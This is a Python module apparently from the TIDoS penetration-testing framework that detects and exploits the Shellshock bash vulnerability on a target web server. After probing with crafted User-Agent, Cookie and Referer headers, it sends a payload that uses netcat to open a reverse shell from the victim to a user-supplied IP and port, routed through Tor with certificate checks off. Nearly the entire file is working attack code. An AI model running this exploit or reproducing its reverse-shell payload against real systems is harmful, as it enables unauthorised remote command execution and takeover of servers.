#!/usr/bin/env python3
# coding: utf-8

#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

#Author: @_tID
#This module requires TIDoS Framework
#https://github.com/0xInfection/TIDoS-Framework


from core.methods.tor import session
import time
from random import *
import string
import re
from core.Core.colors import *

info = "Shellshock Exploit."
searchinfo = "Shellshock Exploit"
properties = {"SHELL-IP":["IP for the reverse shell to connect to", " "], "SHELL-PORT":["Port for the reverse shell to connect to", " "]}

def shellshock0x00(web):
    requests = session()
    print(GR+' [*] Parsing strings...')
    time.sleep(0.5)
    r_str = ''.join(Random().sample(string.ascii_letters, 30))
    print(GR+' [*] Configuring payloads...')
    con = '() { :;}; echo; echo; echo %s'%(r_str)
    cmd = "() { test;};/bin/nopatchobfu"
    headers = {'User-agent': cmd}
    time.sleep(0.5)
    print(C+' [*] Making no-verify request...')
    time.sleep(1)
    r = requests.get(web, headers=headers, verify=False)
    if r.status_code == 500 or r.status_code == 502:
        print(G+' [+] The website seems Vulnerable to Shellshock...'+C+color.TR2+C)
        time.sleep(0.5)
        print(C+' [*] Confirming the vulnerability...'+C)

        headers = {
                    'User-Agent' : con,
                    'Cookie'     : con,
                    'Referer'    : con
                }

        resp = requests.get(web, headers=headers, verify=False)
        if resp.status_code == 200:
            if re.search(r_str,resp.content,re.I):
                print(O+' [+] ShellShock was found in:'+C+color.TR3+C+G+resp.url+C+color.TR2+C)
                print(P+' [*] Preparing for the exploitation phase...'+C)
                time.sleep(0.4)
                print(GR+' [*] Configuring payload...')
                if properties["SHELL-IP"][1] == " ":
                    ip = input(C+' [§] Enter reverse IP :> ')
                else:
                    ip = properties["SHELL-PORT"][1]
                if properties["SHELL-IP"][1] == " ":
                    port = input(' [§] Enter port :> ')
                else:
                    port = properties["SHELL-PORT"][1]
                exp = '() { :; }; /bin/bash -c "nc -v '+str(ip)+' '+str(port)+' -e /bin/bash -i"'
                time.sleep(0.7)
                print(C+' [!] Using payload : '+B+exp)
                print(GR+' [*] Exploiting...')
                time.sleep(1)
                print(P+' [!] Using no-verify mode to avoid IP leakage...'+C)
                try:
                    head = {'User-agent':exp}
                    r=requests.get(web, headers=head, verify=False)
                except Exception:
                    print(R+' [-] Exploit failed...')

        else:
            print(R+' [-] 2nd phase of detection does not reveal vulnerability...')
            print(R+' [!] Please check manually...')
    else:
        print(R+' [-] The website seems immune to shellshock...')

def shellshock_exp(web):

    print(GR+'\n [*] Loading module...')
    time.sleep(0.5)
    #print(R+'\n    ================================')
    #print(R+'     S H E L L S H O C K  (Exploit)')
    #print(R+'    ================================\n')
    from core.methods.print import psploit
    psploit("shellshock") 
    shellshock0x00(web)

def attack(web):
    web = web.fullurl
    shellshock_exp(web)
